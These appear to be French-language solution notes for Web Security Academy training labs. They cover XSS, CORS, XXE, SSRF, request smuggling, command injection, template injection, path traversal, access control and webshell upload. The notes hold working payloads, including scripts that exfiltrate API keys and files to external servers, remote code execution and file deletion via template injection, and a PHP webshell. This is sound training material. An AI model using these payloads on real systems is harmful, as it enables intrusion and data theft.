    <iframe src="https://0afd00f00393bec681dfe97200090073.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">


### DOM XSS using web messages and a JavaScript URL

Même principe qu'avant mais on a cette fois une vérification très précaire : 

    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }

Cette vérification peut facilement se contourner en mettant une de ces deux valeurs en commentaire.

Mettre le payload suivant dans le serveur d'exploitation :

    <iframe src="https://0ab500a403ba994980dd177d00440017.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

### DOM XSS using web messages and JSON.parse

Observer le morceau suivant dans le code source de la page d'accueil :

    window.addEventListener('message', function(e) {
                var iframe = document.createElement('iframe'),
                    ACMEplayer = {
                        element: iframe
                    },
                    d;
                document.body.appendChild(iframe);
                try {
                    d = JSON.parse(e.data);
                } catch (e) {
                    return;
                }
                switch (d.type) {
                    case "page-load":
                        ACMEplayer.element.scrollIntoView();
                        break;
                    case "load-channel":
                        ACMEplayer.element.src = d.url;
                        ...
                        
Mettre le payload suivant dans le serveur d'exploitation : 

    <iframe src=https://0a080090048210ca8a2785df00280005.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>


### DOM-based open redirection

Observer le morceau suivant dans le code source de la page de n'importe quel article : 

    <div class="is-linkback">
        <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
    </div>

Il s'agit donc d'une simple redirection à injecter dans l'URL : 

    https://0a75009503d9c09d840573430015008f.web-security-academy.net/post?postId=4&url=https://exploit-0a3800f70389c09484ab725301290099.exploit-server.net/


### DOM-based cookie manipulation

En utilisant la fonctionnalité "Last viewed product", on observe que le dernier produit visité est stocké dans un cookie : 

>Cookie: session=sIQQUgYkG5gRoFzGXAW2nzaF9yBRh407; lastViewedProduct=https://0aba0028033eb0f382ac292800cb00a7.web-security-academy.net/product?productId=4

Mettre le payload suivant dans le serveur d'exploitation : 

    <iframe src="https://0aba0028033eb0f382ac292800cb00a7.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0aba0028033eb0f382ac292800cb00a7.web-security-academy.net';window.x=1;">


### Exploiting DOM clobbering to enable XSS

### Clobbering DOM attributes to bypass HTML filters


## === Cross-origin resource sharing (CORS) ===

Headers à tester dans la requête : 

- Origin: abc.com
- Origin: null
- Origin: http://sous-domaine.site_cible.com


### CORS vulnerability with basic origin reflection

Cas le plus simple d'un site web mal configuré et acceptant toutes les origines.

Avec le chemin "/my-account?id=wiener" on peut voir notre propre clé API

En regardant l'historique sur Burp, on voit que cette requête est un "**GET /accountDetails**" et que sa réponse contient le header suivant : 

>Access-Control-Allow-Credentials: true


Cela signifie que les requêtes CORS venant du domaine source (l'origine) spécifié dans l'en-tête **Origin** peuvent inclure des informations d'identification.

On peut donc reprendre le bout de code Javascript donné dans l'explication précédant le lab et l'adapter à ce cas : 

    <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a60001c04ac505180dc269700f0000b.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://exploit-0a7500b9040050d5808625b8012100c7.exploit-server.net/log?key='+this.responseText;
    };
    </script>
    
    
    
Ce code doit être mis dans le serveur d'exploitation pour que la victime clique dessus.


### CORS vulnerability with trusted null origin

Pour ce cas, le site est mieux configuré mais a whitelisté l'origine "null", ce qui peut être utile pendant une phase de développement en local par exemple.

En incluant notre script dans une iframe, on lui donnera une origine "null" et on pourra donc contourner cette configuration.


    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','0a340009031740fb824ab59c008c00f4.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location='https://exploit-0a0600bd032540598200b4a0013500e5.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
        };
    </script>"></iframe>



### CORS vulnerability with trusted insecure protocols

Cas de figure d'un site bien configuré mais qui accepte en origine un autre site vulnérable et joignable en HTTP. 

Dans le cadre de ce lab il n'est pas possible de faire du MITM et il faut donc trouver une alternative pour injecter le code dans le sous-domaine.

En fouillant le site, on voit que la fonctionnalité "Check stock" des différents produits ouvre une nouvelle fenêtre dont l'URL est du type "stock.0a4b002104e86a5c861a42de009200bd.web-security-academy.net/?productId=1&storeId=1"

On tient donc un sous-domaine.

En jouant avec la requête de vérification du stock, on peut voir que le premier paramètre est vulnérable à une XSS : 

    GET /?productId=<s>1</s>&storeId=<s>1</s> HTTP/1.1

><h4>ERROR</h4>Invalid product ID: <s>1</s>


En poussant cette XSS plus loin, on peut donc l'utiliser pour faire une requête vers le site principal afin de récupérer la clé API de l'administrateur de la même manière que dans les autres labs.

Code à envoyer dans le serveur d'exploitation pour que la victime clique : 

    <script>
    document.location="http://stock.0a4b002104e86a5c861a42de009200bd.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a4b002104e86a5c861a42de009200bd.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac1009004dc6a8286884148014100c3.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>


### CORS vulnerability with internal network pivot attack



## === XML external entity (XXE) injection ===

### Exploiting XXE using external entities to retrieve files

En utilisant la fonction "Check stock" sur n'importe quel produit, on voit que les données transmises sont envoyées au format XML.

En modifiant le XML avec un payload de XXE classique, on obtient une erreur 400 dont le contenu contient le fichier /etc/passwd : 

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
    </stockCheck>

### Exploiting XXE to perform SSRF attacks

Même principe qu'au-dessus mais avec un payload de SSRF : 


    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
    </stockCheck>
    
Le chemin se retrouve étape par étape à partir de la racine puisque le nom des sous-dossiers est renvoyé à chaque fois. 


### Blind XXE with out-of-band interaction

Même principe qu'au-dessus mais avec une adresse extérieure que l'on contrôle :

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://p3t5kp5y5jwxzw5c6zfp9zt3muslgb40.oastify.com">]>
    <stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
    </stockCheck>


### Blind XXE with out-of-band interaction via XML parameter entities

Même principe qu'au-dessus mais avec les entities classiques bloquées : 

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://5pvl65rerzidlcrssf15vffj8ae12sqh.oastify.com"> %xxe; ]>
    <stockCheck>
    <productId>%xxe;</productId>
    <storeId>1</storeId>
    </stockCheck>


### Exploiting blind XXE to exfiltrate data using a malicious external DTD

Héberger un DTD externe permet de rendre possible l'exfiltration de données dans le cadre d'une blind XXE. L'exfiltration peut toutefois échouer si il y a des caractères de type retour à la ligne dans le fichier, c'est pourquoi **/etc/hostname** peut être un bon premier test alternatif à **/etc/passwd**


Code à héberger sur le serveur d'exploitation :


    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://jczc6bq6dhues5s3n5he15eev51wpmdb.oastify.com/?x=%file;'>">
    %eval;
    %exfil;



Payload à ajouter au contenu XML de la fonction "Check stock" de n'importe quel produit : 

    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a14001303ee106c83b0721e01c5004a.exploit-server.net/exploit.dtd"> %xxe;]>


On reçoit bien le contenu du fichier /etc/hostname en paramètre de la requête HTTP au Collaborator

### Exploiting blind XXE to retrieve data via error messages


Code à héberger sur le serveur d'exploitation :

    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;

Payload à ajouter au contenu XML de la fonction "Check stock" de n'importe quel produit :

    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a0500eb04db14228550570e015a0065.exploit-server.net/exploit.dtd"> %xxe;]>


On reçoit bien le contenu du fichier /etc/passwd dans le corps de la page de l'erreur 400 obtenue


### Exploiting XInclude to retrieve files

L'exemple du cours fonctionne directement mais il faut bien l'ajouter comme valeur du paramètre **productId** : 


    productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1


### Exploiting XXE via image file upload


    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

Le contenu du fichier se retrouve dans l'image après le processing de cette dernière, il faut retourner sur notre profil et regarder l'avatar.

### Exploiting XXE to retrieve data by repurposing a local DTD 

TO DO 



## === Server-side request forgery (SSRF) ===

### Basic SSRF against the local server

La page https://0a48007504a4974a81a78eee00540025.web-security-academy.net/admin est réservée aux administrateurs.

Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp.

Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://localhost/admin” 

Dans le code de la réponse on peut remarquer : 

    <a href="/admin/delete?username=carlos">

Reproduire la même interception de requête mais cette fois avec “stockApi=http://localhost/admin/delete?username=carlos”
    
### Basic SSRF against another back-end system
    
Utiliser la fonction “Check stock” sur n’importe quel article et l’intercepter sur Burp. 

Changer le paramètre “stockApi=XXX” de cette requête POST en “stockApi=http://192.168.0.1:8080/admin” puis faire une attaque de 1 à 255 sur le dernier octet de l’IP avec l’Intruder.

Noter l’IP qui donne accès à la page d’administration et reproduire la requête dans le Repeater : 
“stockApi=http://192.168.0.41:8080/admin/delete?username=carlos “

### Blind SSRF with out-of-band detection

Cas d'un site qui utilise une fonction reprenant l'URL spécifiée dans le header "Referer" lorsque la page d'un produit est chargée.

    Referer: https://8bkxox7z6q7ahaebmc9l18ou7ldc19py.oastify.com
    
### SSRF with blacklist-based input filter

En fouillant le site, on voit que la fonction "Check stock" présente sur tous les produits fait appel à une URL externe : 

>stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

En testant un appel sur Collaborator on a bien un retour : 

>stockApi=https://q3ufgfzhy8zs9s6teu13tqgcz35utshh.oastify.com

Toutefois, en essayant de supprimer Carlos comme demandé dans la consigne, on a une erreur de sécurité : 

>http://localhost/admin/delete?username=carlos

>"External stock check blocked for security reasons"

Les payloads suivants semblent également bloqués : 

    http://127.0.0.1/admin/delete?username=carlos
    %68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73
    
    http://127.1/admin/delete?username=carlos
    %68%74%74%70%3a%2f%2f%31%32%37%2e%31%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73
    
    
En revanche, en reprenant le deuxième payload mais avec un double encodage sur un caractère, on semble pouvoir contourner le filtre : 

    http://127.1/%2561dmin/delete?username=carlos
    

### SSRF with filter bypass via open redirection vulnerability

On a toujours la même fonction de vérification du stock, mais cette fois la page d'un produit contient aussi un bouton "Next product" pointant sur le produit suivant.

La requête découlant de ce bouton est la suivante : 

>GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/2


Sur la requête "**POST /product/stock**", en remplaçant le paramètre "**stockApi**" par le chemin de l'interface d'administration on retombe bien sur cette dernière, on peut donc exploiter l'open redirection pour supprimer Carlos facilement : 

    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos


### SSRF with whitelist-based input filter

En essayant quelques payloads on a une erreur 400 explicite : 

>"External stock check host must be stock.weliketoshop.net"



## === HTTP request smuggling ===

Bien désactiver l'option **Update Content-Length** dans les requêtes HTTP pour toute cette série de labs.

### Confirming a CL.TE vulnerability via differential responses

Utiliser l'extension "HTTP Request Smuggler" ou envoyer deux fois la requête suivante : 

    POST / HTTP/1.1
    Host: 0adf00df039a12ba80d74ebf007700f0.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 35
    Transfer-Encoding: chunked

    0

    GET /404 HTTP/1.1
    X-Ignore: X



### Confirming a TE.CL vulnerability via differential responses

Utiliser l'extension "HTTP Request Smuggler" ou envoyer deux fois la requête suivante : 

    POST / HTTP/1.1
    Host: 0a88000304a0cd288184d42600ce0032.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked

    5e
    POST /404 HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0



### Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

X
### Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

X

### Exploiting HTTP request smuggling to reveal front-end request rewriting

X

### Exploiting HTTP request smuggling to capture other users' requests

X

### Exploiting HTTP request smuggling to deliver reflected XSS

    POST / HTTP/1.1
    Host: 0ad300b703e2e092814e708c00d10046.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 150
    Transfer-Encoding: chunked

    0

    GET /post?postId=5 HTTP/1.1
    User-Agent: a"/><script>alert(1)</script>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5

    x=1
    
    
### Response queue poisoning via H2.TE request smuggling

X

### H2.CL request smuggling

X

### HTTP/2 request smuggling via CRLF injection

X

## === OS command injection ===

### OS command injection, simple case

Utiliser la fonction “Check stock” sur n’importe quel article et l’envoyer sur le Repeater.

Remplacer “productId=2&storeId=1” par “productId=2&storeId=1;whoami”

### Blind OS command injection with time delays

    &email=x||ping+-c+10+127.0.0.1||
    
### Blind OS command injection with output redirection

    &email=||whoami>/var/www/images/output.txt||

Il faut ensuite récupérer le fichier grâce à la page de chargement des images des produits : 

    curl https://0ab6004004c363198449041000fc00b5.web-security-academy.net/image?filename=output.txt
    
### Blind OS command injection with out-of-band interaction

    &email=x||nslookup+x.211rerxtwkx47445c6zfr2eoxf36ryfn.oastify.com||

### Blind OS command injection with out-of-band data exfiltration

    &email=||nslookup+`whoami`.uywjbjultcuw4w1x9yw7oubgu70yosch.oastify.com||

## === Server-side template injection ===

Exemple de payload initial à tester : ${{<%[%'"}}%\

### Basic server-side template injection

En essayant de voir les détails du premier produit de la liste, on a une erreur "**Unfortunately this product is out of stock**" et on voit que cette erreur est reflétée dans le header "**Location**" de la réponse puis dans une **seconde requête GET** : 

>Location: /?message=Unfortunately this product is out of stock
>...
>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2

Dans la consigne, il est indiqué que ce lab tourne avec du Ruby / ERB.

En testant un payload classique de SSTI pour Ruby, on a bien une évaluation : 

>GET /?message=<%= 9*9 %> HTTP/2

Payload à utiliser pour supprimer Carlos comme demandé : 

>GET /?message=<%25%3d+system("rm+/home/carlos/morale.txt")+%25> HTTP/2


### Basic server-side template injection (code context)

Dans la consigne, il est indiqué que ce lab tourne avec du Tornado.

Voir : https://ajinabraham.com/blog/server-side-template-injection-in-tornado

Dans la requête de changement de format, on voit un paramètre potentiellement vulnérable aux SSTI : 

    blog-post-author-display=user.first_name&csrf=3a2j2ElX1FPC5bifVQLZ0eJfo5hUZg5q

Payloads utilisés : 

    blog-post-author-display={{9*9}}
    blog-post-author-display={{9*9}}{%%20import%20os%20%}{{os.popen(%22whoami%22).read()}
    blog-post-author-display={{9*9}}{%%20import%20os%20%}{{os.popen(%22rm%20/home/carlos/morale.txt%22).read()}
    

### Server-side template injection using documentation

Chaque produit a une fonctionnalité "Edit template" et cela permet de remarquer que le site utilise des templates de la forme ${XXX} : 

><p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>

En modifiant le dernier template par ${9*9} on a bien une évaluation.

En modifiant le dernier template par ${AAAAA} on a une erreur donnant plus d'informations sur le back-end : 

>FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> AAAAAAAAA [in template "freemarker" at line 4, column 62]
>...

Voir : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#freemarker-java 

Payloads utilisés : 

    ${"freemarker.template.utility.Execute"?new()("id")}
    ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}

### Server-side template injection in an unknown language with a documented exploit

En essayant de voir les détails du premier produit de la liste, on a une erreur "**Unfortunately this product is out of stock**" et on voit que cette erreur est reflétée dans le header "**Location**" de la réponse puis dans une **seconde requête GET** : 

>Location: /?message=Unfortunately this product is out of stock
>...
>GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2

Fuzzing sur le message : 

>GET /?message=${{<%[%'"}}%\

On obtient une erreur révélant le back-end : 

>/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
            throw new Error(str);
>...
>Node.js v19.8.1


Voir : http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

Payload final à encoder et à mettre dans le paramètre : 

    wrtz{{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
                {{this.pop}}
                {{this.push (lookup string.sub "constructor")}}
                {{this.pop}}
                {{#with string.split as |codelist|}}
                    {{this.pop}}
                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                    {{this.pop}}
                    {{#each conslist}}
                        {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                        {{/with}}
                    {{/each}}
                {{/with}}
            {{/with}}
        {{/with}}
    {{/with}}

### Server-side template injection with information disclosure via user-supplied objects

Chaque produit a une fonctionnalité "Edit template" et cela permet de remarquer que le site utilise des templates de la forme {{XXX}}

En provoquant une erreur dans un template on obtient le type de back-end : 

>Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, 
>...

Voir : https://docs.djangoproject.com/en/5.0/ref/settings/#secret-key 

Payloads : 

    {% debug %}
    {{settings.SECRET_KEY}}

## === Path traversal ===

### File path traversal, simple case

        GET /image?filename=../../../etc/passwd

### File path traversal, traversal sequences blocked with absolute path bypass

	GET /image?filename=/etc/passwd
    
### File path traversal, traversal sequences stripped non-recursively

	GET /image?filename=....//....//....//etc/passwd
    
### File path traversal, traversal sequences stripped with superfluous URL-decode

	GET /image?filename=..%252f..%252f..%252fetc/passwd
    
### File path traversal, validation of start of path

	GET /image?filename=/var/www/images/../../../../../etc/passwd
    
### File path traversal, validation of file extension with null byte bypass

	GET /image?filename=../../../etc/passwd%00.png


## === Access control vulnerabilities === 

### Unprotected admin functionality

	GET /robots.txt
	GET /administrator-panel
	GET /administrator-panel/delete?username=carlos
    
### Unprotected admin functionality with unpredictable URL

Observer le code-source de la page et remarquer cette partie : 
	
> adminPanelTag.setAttribute('href', '/admin-vnq2da');

	GET /admin-vnq2da
	GET /admin-vnq2da/delete?username=carlos
    
### User role controlled by request parameter

	GET /admin

Aller sur la page de login, puis commencer à intercepter les requêtes ET les réponses (“Proxy settings” => “Intercept reponses based on the following rules:”). 

Se connecter sur cette page avec les credentials d’utilisateur simple donnés dans la consigne.

Changer “Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=false” en 
“Cookie: session=VrbUBr7c6DzenjfmQuOIDax5UndrINrK; Admin=true” dans la réponse puis dans chaque requête que l’on va effectuer avec cet utilisateur simple.

### User ID controlled by request parameter, with unpredictable user IDs

Aller sur n’importe quel article posté par Carlos et observer le paramètre “userId=d22a802d-ac88-48ff-b237-c137214a0f89” dans l’URL.

Se connecter avec le compte utilisateur fourni dans la consigne puis reprendre ce paramètre et le mettre dans l’URL suivante à la place du nôtre : 
https://0a98001b04df8474826c92e2004700dc.web-security-academy.net/my-account?id=fc22df53-bdc5-484b-9c5b-8f1b952d4f5a 

### User ID controlled by request parameter with password disclosure

Se connecter sur la page de login avec le compte utilisateur fourni dans la consigne.

Aller dans l’onglet “My account” et changer le paramètre de l’URL en “Administrator” : 

    GET /my-account?id=administrator

Observer le code HTML de la réponse obtenue, le mot de passe se trouve dans un formulaire caché : 

    <input required type=password name=password value='wz5ub7i9y4vqvcspqek2'/>

## === Authentication === 

### Username enumeration via different responses

Lancer un Intruder pour déduire le vrai nom (Length 3250 vs Length 3248).
Lancer un deuxième Intruder avec le nom pour bruteforcer le login.

### 2FA simple bypass

Se connecter sur la page de login avec le compte fourni dans la consigne.
Aller sur l’onglet “Email client” pour réceptionner le 2FA.
Entrer le 2FA pour terminer l’authentification avec le premier compte.
Remarquer que l’URL se termine par “/my-account?id=wiener”.

Se connecter avec les credentials de la victime.

Quand le 2FA est demandé pour la victime, remplacer la fin de l’URL par “/my-account?id=carlos” et relancer la page.

## === WebSockets === 

### X

## === Web cache poisoning ===

### X

## === Insecure deserialization === 

### X

## === Information disclosure ===

### X

## === Business logic vulnerabilities ===

### X 

## === HTTP Host header attacks ===

### X 

## === OAuth authentication ===

### X 

## === File upload vulnerabilities ===

### Remote code execution via web shell upload

Se connecter sur la page /my-account et changer d’avatar. D’abord choisir une image classique. 

Une fois l’image uploadée, rafraîchir pour regarder son compte et observer la requête avec Burp. Remarquer le morceau suivant : 

    <img src="/files/avatars/Nietzsche.jpg" class=avatar>

Changer d’avatar une deuxième fois et mettre un webshell PHP classique à la place : 

    <?php echo system($_GET['command']); ?>

Exécuter le webshell en allant sur l’URL trouvée à partir de l’image : 

> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=ls

> https://0a31007e03aad04685695dc0002c00cf.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 

### Web shell upload via Content-Type restriction bypass

Tenter de déposer le même webshell que pour le lab précédent.

On voit cette erreur : 

“Sorry, file type application/octet-stream is not allowed 
Only image/jpeg and image/png are allowed 
Sorry, there was an error uploading your file.”

Sur Burp, prendre la requête POST et la transférer au Repeater.

Remplacer “Content-Type: application/octet-stream” par “Content-Type: image/jpeg” et la renvoyer

Aller sur l’URL permettant d’interagir avec le webshell : 

> https://0a4700d2034ad0458506767700390095.web-security-academy.net/files/avatars/Webshell.php?command=cat%20/home/carlos/secret 

## === JWT ===

### X

## === Essential skills ===

### X

## === Prototype pollution ===

### X 

## === GraphQL API vulnerabilities ===

### X 

## === Race conditions ===

### X

## === NoSQL injection ===

### X

## === API testing ===

### Exploiting an API endpoint using documentation

En utilisant la fonctionnalité de changement d'adresse, on voit qu'elle fait une requête vers un endpoint : 

>PATCH /api/user/wiener HTTP/2

Requêtes à faire pour explorer la documentation de l'API puis supprimer Carlos : 

>GET /api/ HTTP/2
>DELETE /api/user/carlos HTTP/2

### Exploiting server-side parameter pollution in a query string

La requête de réinitialisation du mot de passe effectue une requête POST avec un paramètre "**username**" et est associée à une requête GET sur un fichier Javascript : 

>POST /forgot-password HTTP/2
>...
>csrf=lxuaYEvzuwJoqruzETFb3N3DYXE6Fk5c&username=administrator
>...
>GET /static/js/forgotPassword.js

En essayant de polluer ce paramètre, on obtient quelques résultats intéressants : 

**&username=administrator&aaa=bbb** => Réponse classique
**&username=administrator%26aaa=bbb** => "Parameter is not supported."
**&username=administrator%23** => "Field not specified."
**&username=administrator%26field=abc** => "Invalid field."

En fuzzant ce paramètre sur Intruder (Add from list -> Server-side variable names), on trouve une seule réponse valide pour "**email**"

Le payload **&username=administrator%26field=email** renvoie la même réponse classique qui nous résume les valeurs entrées.

En fouillant le fichier **forgotPassword.js** on remarque une variable **${resetToken}** : 

    [...]
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    [...]

En remplaçant "email" par "reset-token" on obtient ce qui ressemble à un token : 

**&username=administrator%26field=reset-token**

>{"type":"reset_token","result":"uw04lq6pgerbhol1plbqzll893oo9s3m"}

Il n'y a plus qu'à utiliser ce token dans la requête de changement de mot de passe : 

https://0a85004a04a9c13786ea18cf00760090.web-security-academy.net/forgot-password?reset_token=uw04lq6pgerbhol1plbqzll893oo9s3m

Attention à bien encoder les caractères de type '&', '#', etc.

### Finding and exploiting an unused API endpoint

En essayant de modifier le verbe de la requête vers **/api/products/1/price** on obtient le résultat suivant : 

>HTTP/2 405 Method Not Allowed
>Allow: GET, PATCH

En essayant de mettre un PATCH on a l'erreur suivante : 

    {"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}

En ajoutant le bon Content-Type et en mettant du JSON on a l'erreur suivante : 

    {"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
    
En mettant le contenu suivant, cela fonctionne : 

    {"price":0}

Le prix de la veste passe à 0 et on peut l'acheter gratuitement.

### Exploiting a mass assignment vulnerability

X

### Exploiting server-side parameter pollution in a REST URL

## === Web LLM attacks === 

### X
